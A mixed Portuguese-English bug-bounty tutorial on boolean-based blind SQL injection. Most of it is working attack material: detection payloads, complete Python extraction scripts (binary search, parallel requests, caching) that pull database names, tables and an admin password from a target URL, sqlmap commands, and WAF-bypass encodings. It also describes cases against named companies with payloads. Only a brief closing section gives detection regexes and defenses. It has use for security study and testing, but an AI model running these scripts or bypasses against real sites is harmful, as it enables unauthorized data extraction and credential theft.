# Boolean-Based Blind SQL Injection

**Criticidade**: 🔴 Crítica (CVSS 8.0-9.0)
**Dificuldade**: 🟡 Intermediária
**Bounty Médio**: $2,000 - $12,000 USD

---

## 📚 Índice

1. [Boolean-Based Fundamentals](#boolean-based-fundamentals)
2. [Detection Techniques](#detection-techniques)
3. [Binary Search Optimization](#binary-search-optimization)
4. [Character Extraction](#character-extraction)
5. [Conditional Logic](#conditional-logic)
6. [Boolean-Based Automation](#boolean-based-automation)
7. [WAF Bypass Techniques](#waf-bypass-techniques)
8. [Real-World Cases](#real-world-cases)

---

## 🔬 Boolean-Based Fundamentals

### O Que É Boolean-Based Blind SQLi?

**Boolean-based blind SQL injection** é uma técnica onde o atacante **infere dados** através de **respostas diferentes** da aplicação baseadas em **condições TRUE/FALSE**.

**Key Difference:**

```
Normal SQLi:
  → Dados diretamente visíveis no output

Blind Boolean SQLi:
  → Sem dados visíveis
  → Apenas mudanças no comportamento da página
  → TRUE: página normal
  → FALSE: página diferente (erro, vazia, redirect)
```

### How It Works

**Scenario:** Login page checking username

**Normal Request:**
```
GET /login?username=admin
```

**Response:**
- ✅ User exists: "Welcome back!"
- ❌ User not exists: "Invalid username"

**Injection:**
```sql
-- Test if first char of password is 'a'
admin' AND SUBSTRING(password, 1, 1) = 'a' --

TRUE response → First char IS 'a'
FALSE response → First char is NOT 'a'
```

**Iteração:**
```
Test 'a': FALSE
Test 'b': FALSE
Test 'c': FALSE
...
Test 'p': TRUE → First char = 'p'

Test 'pa': TRUE → Second char = 'a'
Test 'pas': TRUE → Third char = 's'
Test 'pass': TRUE → Fourth char = 's'

Password = "pass..."
```

---

## 🔍 Detection Techniques

### Method 1: AND TRUE/FALSE

**Test 1: Always TRUE**
```sql
' AND 1=1 --
```

**Expected:** Normal page (200 OK)

**Test 2: Always FALSE**
```sql
' AND 1=2 --
```

**Expected:** Different page (error, empty, redirect)

**Comparison:**

```python
import requests

url = "http://target.com/product?id=1"

# Baseline
response1 = requests.get(url + "' AND 1=1 --")
# Should return normal page

response2 = requests.get(url + "' AND 1=2 --")
# Should return different page

if response1.text != response2.text:
    print("✅ VULNERABLE to Boolean-based SQLi!")
    print(f"TRUE length: {len(response1.text)}")
    print(f"FALSE length: {len(response2.text)}")
else:
    print("❌ Not vulnerable")
```

### Method 2: OR Logic

**Test 1: OR TRUE (always matches)**
```sql
' OR '1'='1
```

**Expected:** Returns all records / bypass login

**Test 2: OR FALSE (no effect)**
```sql
' OR '1'='2
```

**Expected:** Normal behavior

### Method 3: Conditional Logic

**Test database version:**

```sql
-- MySQL
' AND (SELECT @@version) LIKE '5.%' --

-- PostgreSQL
' AND (SELECT version()) LIKE 'PostgreSQL 13%' --

-- SQL Server
' AND @@version LIKE '%SQL Server 2019%' --
```

**Test table existence:**

```sql
' AND (SELECT COUNT(*) FROM users) > 0 --
```

**Response:**
- ✅ TRUE: Table `users` exists
- ❌ FALSE: Table doesn't exist or error

---

## 🔢 Binary Search Optimization

### Problem: Brute Force is Slow

**Naive approach:**
```python
charset = 'abcdefghijklmnopqrstuvwxyz0123456789'

for char in charset:
    payload = f"' AND SUBSTRING(password,1,1)='{char}' --"
    if test_payload(payload):
        print(f"First char: {char}")
        break

# Worst case: 36 requests per character!
# Password of 10 chars: 360 requests
```

### Solution: Binary Search

**Algorithm:**

```python
def binary_search_char(position):
    """
    Use binary search to find character at position.
    O(log n) instead of O(n)
    """
    low = 32   # ' ' (space)
    high = 126 # '~' (tilde)

    while low <= high:
        mid = (low + high) // 2

        # Test if char at position > mid
        payload = f"' AND ASCII(SUBSTRING(password,{position},1)) > {mid} --"

        if is_true(payload):
            low = mid + 1   # char is in upper half
        else:
            high = mid - 1  # char is in lower half

    return chr(low)

# Example for first character:
# ASCII range: 32-126 (94 chars)

# Test > 79:  TRUE  → range: 80-126
# Test > 103: FALSE → range: 80-103
# Test > 91:  FALSE → range: 80-91
# Test > 85:  FALSE → range: 80-85
# Test > 82:  TRUE  → range: 83-85
# Test > 84:  FALSE → range: 83-84
# Test > 83:  FALSE → range: 83-83
# Result: 83 = 'S'

# Only 7 requests instead of 94!
```

**Complexity Comparison:**

```
Brute force:
- Lowercase only (26 chars): avg 13 requests/char
- Alphanumeric (62 chars): avg 31 requests/char
- Full ASCII (94 chars): avg 47 requests/char

Binary search:
- Any charset: max 7 requests/char (log2(128))
- Always: log2(charset_size) requests
```

**Complete Implementation:**

```python
import requests
import time

def is_true_response(response):
    """Determine if response indicates TRUE condition."""
    # Method 1: Content length
    if len(response.text) > 5000:
        return True

    # Method 2: Specific string
    if "Welcome" in response.text:
        return True

    # Method 3: Status code
    if response.status_code == 200:
        return True

    return False

def test_condition(url, condition):
    """Test a SQL condition and return TRUE/FALSE."""
    payload = f"' AND {condition} --"
    response = requests.get(url + payload)
    time.sleep(0.1)  # Rate limiting
    return is_true_response(response)

def extract_string_binary(url, sql_expression, max_length=50):
    """
    Extract string using binary search.

    Args:
        url: Target URL with injectable parameter
        sql_expression: SQL expression to extract (e.g., "password")
        max_length: Maximum expected length

    Returns:
        Extracted string
    """
    result = ""

    # First, determine actual length
    length = 0
    for i in range(1, max_length + 1):
        condition = f"LENGTH({sql_expression}) = {i}"
        if test_condition(url, condition):
            length = i
            break

    print(f"[+] Length: {length}")

    # Extract each character
    for position in range(1, length + 1):
        low = 32
        high = 126

        while low <= high:
            mid = (low + high) // 2

            condition = f"ASCII(SUBSTRING({sql_expression},{position},1)) > {mid}"

            if test_condition(url, condition):
                low = mid + 1
            else:
                high = mid - 1

        char = chr(low)
        result += char
        print(f"[+] Position {position}/{length}: {char} (ASCII {low})")

    return result

# Usage
url = "http://target.com/product?id=1"
password = extract_string_binary(url, "(SELECT password FROM users WHERE id=1)")
print(f"\n[+] Extracted password: {password}")
```

---

## 🔤 Character Extraction

### Technique 1: SUBSTRING() + ASCII()

**MySQL:**
```sql
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 1)) > 100 --
```

**PostgreSQL:**
```sql
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)) > 100 --
```

**SQL Server:**
```sql
' AND ASCII(SUBSTRING((SELECT password FROM users), 1, 1)) > 100 --
```

### Technique 2: ORD() Function

**Alternative to ASCII():**

```sql
' AND ORD(SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 1)) > 100 --
```

### Technique 3: LIKE Operator

**Pattern matching approach:**

```sql
-- Test if password starts with 'a'
' AND (SELECT password FROM users LIMIT 0,1) LIKE 'a%' --

-- Test if password starts with 'ad'
' AND (SELECT password FROM users LIMIT 0,1) LIKE 'ad%' --

-- Test if password starts with 'adm'
' AND (SELECT password FROM users LIMIT 0,1) LIKE 'adm%' --
```

**Optimization with character ranges:**

```sql
-- Test if first char is between 'a' and 'm'
' AND (SELECT password FROM users LIMIT 0,1) BETWEEN 'a' AND 'n' --
```

**Binary search with LIKE:**

```python
def extract_with_like(url, sql_expression):
    result = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789_-@."

    while True:
        found = False

        for char in charset:
            test = result + char
            condition = f"({sql_expression}) LIKE '{test}%'"

            if test_condition(url, condition):
                result = test
                print(f"[+] Found: {result}")
                found = True
                break

        if not found:
            break  # No more characters

    return result
```

### Technique 4: REGEXP / RLIKE (MySQL)

**Regular expression matching:**

```sql
-- Test if first char is lowercase letter
' AND (SELECT password FROM users LIMIT 0,1) REGEXP '^[a-z]' --

-- Test if first char is 'a' to 'm'
' AND (SELECT password FROM users LIMIT 0,1) REGEXP '^[a-m]' --

-- Test if first char is 'a' to 'f'
' AND (SELECT password FROM users LIMIT 0,1) REGEXP '^[a-f]' --
```

**Binary search with REGEXP:**

```python
def binary_search_regex(url, position):
    low = ord('a')
    high = ord('z')

    while low <= high:
        mid = (low + high) // 2
        mid_char = chr(mid)

        # Test if char at position is <= mid_char
        condition = f"(SELECT password FROM users LIMIT 0,1) REGEXP '^.{{{position-1}}}[a-{mid_char}]'"

        if test_condition(url, condition):
            high = mid - 1
        else:
            low = mid + 1

    return chr(high + 1)
```

---

## 🔀 Conditional Logic

### IF() Statement (MySQL)

**Syntax:**
```sql
IF(condition, true_value, false_value)
```

**Exploitation:**

```sql
' AND IF(
    (SELECT COUNT(*) FROM users) > 10,
    1,
    (SELECT 1 FROM non_existent_table)
) --
```

**Logic:**
- If users > 10: returns 1 (TRUE)
- If users ≤ 10: error (tries to select from non-existent table)

**Better approach:**

```sql
' AND IF(
    ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 1)) > 100,
    1,
    0
) = 1 --
```

### CASE Statement (Universal)

**Syntax:**
```sql
CASE
    WHEN condition1 THEN result1
    WHEN condition2 THEN result2
    ELSE result3
END
```

**Exploitation:**

```sql
' AND (
    CASE
        WHEN ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 1)) > 100
        THEN 1
        ELSE 0
    END
) = 1 --
```

**PostgreSQL example:**

```sql
' AND (
    CASE
        WHEN (SELECT version()) LIKE 'PostgreSQL 13%'
        THEN 1
        ELSE (1/0)  -- Division by zero error
    END
) = 1 --
```

### IIF() Function (SQL Server)

**Syntax:**
```sql
IIF(condition, true_value, false_value)
```

**Exploitation:**

```sql
' AND IIF(
    ASCII(SUBSTRING((SELECT password FROM users), 1, 1)) > 100,
    1,
    0
) = 1 --
```

---

## 🤖 Boolean-Based Automation

### SQLMap Boolean Detection

```bash
# Detect boolean-based
sqlmap -u "http://target.com/product?id=1" --technique=B

# Boolean-based only (faster)
sqlmap -u "http://target.com/product?id=1" --technique=B --threads=10

# With custom true/false string
sqlmap -u "http://target.com/page?id=1" \
  --string="Welcome" \
  --not-string="Error"

# With custom true/false code
sqlmap -u "http://target.com/page?id=1" \
  --code=200
```

### Custom Python Script

```python
#!/usr/bin/env python3
import requests
import string
import sys

class BooleanSQLi:
    def __init__(self, url, true_condition):
        self.url = url
        self.true_condition = true_condition
        self.session = requests.Session()

    def test_payload(self, payload):
        """Test if payload returns TRUE response."""
        full_url = self.url + payload
        try:
            response = self.session.get(full_url, timeout=10)
            return self.true_condition(response)
        except:
            return False

    def get_length(self, query):
        """Get length of query result."""
        for length in range(1, 100):
            payload = f"' AND LENGTH({query})={length} --"
            if self.test_payload(payload):
                return length
        return 0

    def extract_data(self, query):
        """Extract data using binary search."""
        length = self.get_length(query)
        print(f"[+] Length: {length}")

        result = ""
        for pos in range(1, length + 1):
            # Binary search for character
            low, high = 32, 126

            while low <= high:
                mid = (low + high) // 2
                payload = f"' AND ASCII(SUBSTRING({query},{pos},1))>{mid} --"

                if self.test_payload(payload):
                    low = mid + 1
                else:
                    high = mid - 1

            char = chr(low)
            result += char
            sys.stdout.write(f"\r[+] Extracted: {result}")
            sys.stdout.flush()

        print()
        return result

# Usage
def is_true(response):
    """Define TRUE condition."""
    return len(response.text) > 1000  # Adjust based on target

url = "http://target.com/product?id=1"
sqli = BooleanSQLi(url, is_true)

# Extract database name
db_name = sqli.extract_data("(SELECT database())")
print(f"[+] Database: {db_name}")

# Extract table names
table = sqli.extract_data("(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)")
print(f"[+] Table: {table}")

# Extract data
password = sqli.extract_data("(SELECT password FROM users WHERE username='admin')")
print(f"[+] Admin password: {password}")
```

---

## 🛡️ WAF Bypass Techniques

### Bypass 1: Comment Variations

```sql
-- Standard comments
' AND 1=1 --
' AND 1=1 #
' AND 1=1 /*

-- Inline comments
' AND 1/*comment*/=/*comment*/1 --

-- MySQL version comment
' AND 1=1 /*!50000 AND 1=1*/ --
```

### Bypass 2: Character Encoding

```sql
-- URL encoding
' %41ND 1=1 --  (%41 = 'A')

-- Double URL encoding
' %2541ND 1=1 --  (%25 = '%')

-- Unicode encoding
' AND 1=1 %u002d%u002d
```

### Bypass 3: Whitespace Obfuscation

```sql
-- Standard
' AND 1=1 --

-- Tab instead of space
'	AND	1=1	--

-- Multiple spaces
'     AND     1=1     --

-- Newline
'
AND
1=1
--

-- Form feed
' AND 1=1 --

-- MySQL comment as space
'/**/AND/**/1=1/**/--
```

### Bypass 4: Function Alternatives

```sql
-- Instead of SUBSTRING
MID((SELECT password FROM users), 1, 1)
LEFT((SELECT password FROM users), 1)
RIGHT((SELECT password FROM users), 1)
SUBSTR((SELECT password FROM users), 1, 1)

-- Instead of ASCII
ORD(MID((SELECT password FROM users), 1, 1))
HEX(MID((SELECT password FROM users), 1, 1))

-- Instead of LENGTH
CHAR_LENGTH((SELECT password FROM users))
CHARACTER_LENGTH((SELECT password FROM users))
```

### Bypass 5: Logic Obfuscation

```sql
-- Instead of AND
' && 1=1 --

-- Instead of OR
' || 1=1 --

-- Instead of =
' AND 1 LIKE 1 --
' AND 1 IN (1) --
' AND 1 BETWEEN 0 AND 2 --

-- Instead of >
' AND NOT 100 <= ASCII(SUBSTRING(password,1,1)) --
```

---

## 🔥 Real-World Cases

### Case 1: Instagram Boolean-Based (2016)

**Vulnerability:** Password reset token validation

**Endpoint:**
```
POST /reset_password
token=[TOKEN]
```

**Discovery:**

```python
# Test 1: Valid token
response1 = post(url, {'token': 'valid_token'})
# Response: "Password reset successful"

# Test 2: Invalid token
response2 = post(url, {'token': 'invalid'})
# Response: "Invalid token"

# Test 3: SQLi boolean
response3 = post(url, {'token': "' AND 1=1 --"})
# Response: "Password reset successful" ← TRUE response!

response4 = post(url, {'token': "' AND 1=2 --"})
# Response: "Invalid token" ← FALSE response!
```

**Exploitation:**

```python
# Extract admin password hash
token = "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>100 --"
```

**Impact:** Could reset any user's password

**Bounty:** $10,000 USD

### Case 2: Yahoo! Sports Boolean-Based (2014)

**Vulnerability:** Team ID parameter

**URL:**
```
https://sports.yahoo.com/team?id=1
```

**Exploitation:**

```sql
-- Detect vulnerability
id=1' AND 1=1 --  → Normal page
id=1' AND 1=2 --  → Different page

-- Extract database version
id=1' AND ASCII(SUBSTRING(@@version,1,1))=53 --  → TRUE (version 5.x)

-- Extract data
id=1' AND ASCII(SUBSTRING((SELECT password FROM admin),1,1))>100 --
```

**Impact:** Full database extraction (2,000+ tables)

**Bounty:** $7,000 USD

### Case 3: GitHub Enterprise Boolean-Based (2017)

**Vulnerability:** Search functionality

**Payload:**
```
search=test' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)='1
```

**Technique:** CASE-based boolean blind

**Impact:** Access to private repository data

**Bounty:** $10,000 USD

---

## 📊 Performance Optimization

### Technique 1: Parallel Requests

```python
import concurrent.futures
import requests

def test_char(position, char_ascii):
    """Test if character at position equals char_ascii."""
    payload = f"' AND ASCII(SUBSTRING(password,{position},1))={char_ascii} --"
    response = requests.get(url + payload)
    return (char_ascii, is_true(response))

def extract_parallel(position, charset_range=(32, 126)):
    """Extract character at position using parallel requests."""
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = [
            executor.submit(test_char, position, ascii_val)
            for ascii_val in range(*charset_range)
        ]

        for future in concurrent.futures.as_completed(futures):
            char_ascii, is_match = future.result()
            if is_match:
                return chr(char_ascii)

    return None

# Extract full password in parallel
password = ""
for i in range(1, 33):  # Assuming max 32 chars
    char = extract_parallel(i)
    if char:
        password += char
        print(f"[+] Position {i}: {char}")
    else:
        break
```

### Technique 2: Caching

```python
class CachedBooleanSQLi:
    def __init__(self, url):
        self.url = url
        self.cache = {}

    def test_payload(self, payload):
        """Test payload with caching."""
        if payload in self.cache:
            return self.cache[payload]

        response = requests.get(self.url + payload)
        result = is_true(response)
        self.cache[payload] = result
        return result
```

### Technique 3: Adaptive Binary Search

```python
def adaptive_binary_search(position, common_chars="etaoinsrhdluc"):
    """
    Try common characters first, then binary search.
    Based on English letter frequency.
    """
    # Try common characters first (fast path)
    for char in common_chars:
        payload = f"' AND SUBSTRING(password,{position},1)='{char}' --"
        if test_payload(payload):
            return char

    # Fall back to binary search
    return binary_search_char(position)
```

---

## 🎯 Detection Signatures

**WAF/IDS Rules:**

```
# Detect boolean logic
AND \d+=\d+
OR \d+=\d+

# Detect comment syntax
--\s*$
#\s*$
/\*.*\*/

# Detect SUBSTRING with ASCII
SUBSTRING\s*\(.*ASCII
ASCII\s*\(.*SUBSTRING

# Detect LENGTH with comparison
LENGTH\s*\(.*\)\s*=\s*\d+
```

**Defense:**

1. **Parameterized queries** (best defense)
2. **Input validation** (whitelist only)
3. **Rate limiting** (prevents automation)
4. **Consistent responses** (same response for all errors)

---

**Última atualização**: 2024
**Versão**: 1.0
